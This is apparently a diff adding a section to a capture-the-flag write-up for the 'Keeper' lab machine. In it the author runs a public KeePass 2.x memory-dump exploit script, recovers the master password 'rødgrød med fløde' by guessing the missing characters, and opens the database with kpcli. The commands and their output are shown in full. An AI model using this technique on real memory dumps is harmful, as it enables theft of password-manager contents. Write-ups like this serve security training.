@@ -214,3 +214,65 @@ After switching to the `History` tab:
 ![Screenshot of the ticket details lnorgaard posted](images/ticket-details.png)
 
 With this I can know for sure that the dump is of the Keepass process. I also saw that this information also holds the hint to where the .zip file was stored.
+
+### Exploiting the memory dump
+[Here]( https://github.com/z-jxy/keepass_dump) I found a script that takes advantage of the vulnerable 2.x Keepass version.
+
+I downloaded it to my machine:
+
+```bash
+(sz3kz@kali)~{tun0:10.10.14.19}~[Keeper]$ git clone https://github.com/z-jxy/keepass_dump.git
+Cloning into 'keepass_dump'...
+remote: Enumerating objects: 10, done.
+remote: Counting objects: 100% (10/10), done.
+remote: Compressing objects: 100% (10/10), done.
+remote: Total 10 (delta 0), reused 10 (delta 0), pack-reused 0 (from 0)
+Receiving objects: 100% (10/10), 280.26 KiB | 1.97 MiB/s, done.
+```
+
+I ran it:
+
+```bash
+(sz3kz@kali)~{tun0:10.10.14.19}~[Keeper]$ python3 keepass_dump/keepass_dump.py -f KeePassDumpFull.dmp
+[*] Searching for masterkey characters
+[-] Couldn't find jump points in file. Scanning with slower method.
+[*] 0:  {UNKNOWN}
+[*] 2:  d
+[*] 3:  g
+[*] 4:  r
+[*] 6:  d
+[*] 7:
+[*] 8:  m
+[*] 9:  e
+[*] 10: d
+[*] 11:
+[*] 12: f
+[*] 13: l
+[*] 15: d
+[*] 16: e
+[*] Extracted: {UNKNOWN}dgrd med flde
+```
+
+The nature of this CVE is that the first character of the password can't be extracted. I contemplated bruteforcing the last character, however the password had no special symbols, which could indicate it is a real phrase(from the user enumeration it is revealed that lnorgaard is Danish).
+
+After googling the phrase I received results of a [Danish dish](https://www.danishfoodlovers.com/danish-red-berry-pudding/), completing the missing info in the phrase:
+
+```bash
+"{UNKNOWN}dgrd med flde" -> "rødgrød med fløde"
+```
+
+(I don't really know why the _ø_ symbols were not printed. Maybe my system did not directly support danish letters?)
+
+This can be used to interract with the `passcodes.kdbx`:
+
+```bash
+(sz3kz@kali)~{tun0:10.10.14.19}~[Keeper]$ sudo apt install kpcli
+(sz3kz@kali)~{tun0:10.10.14.19}~[Keeper]$ kpcli --kdb passcodes.kdbx
+Provide the master password: *************************
+
+KeePass CLI (kpcli) v3.8.1 is ready for operation.
+Type 'help' for a description of available commands.
+Type 'help <command>' for details on individual commands.
+
+kpcli:/>
+```
